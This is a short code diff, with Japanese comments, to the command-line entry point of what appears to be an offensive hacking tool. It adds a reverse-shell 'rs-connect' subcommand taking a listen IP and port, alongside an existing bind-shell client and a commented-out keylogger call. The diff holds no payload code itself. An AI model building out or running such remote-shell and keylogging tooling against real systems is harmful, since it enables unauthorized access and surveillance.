@@ -21,7 +21,9 @@ def main():
     parser_bindshell_client.add_argument('target', help='target ip address')
     
     # reverseshell コマンドの parser を作成
-    
+    parser_reverseshell_client = sub_psr.add_parser('rs-connect', help='see `rs-connect -h`')
+    parser_reverseshell_client.add_argument('listenIp', help='listen my ip address')
+    parser_reverseshell_client.add_argument('listenPort', help='listen my port number')
     
     args = psr.parse_args()
     
@@ -37,7 +39,7 @@ def main():
         # client 要求
         bs_attacker.attacker(args.target)
     elif args.subcommand == 'rs-connect':
-        rs_attacker.attacker()
+        rs_attacker.attacker(args.listenIp, args.listenPort)
         
     # キーロガー
     #keylogger.keylogger()
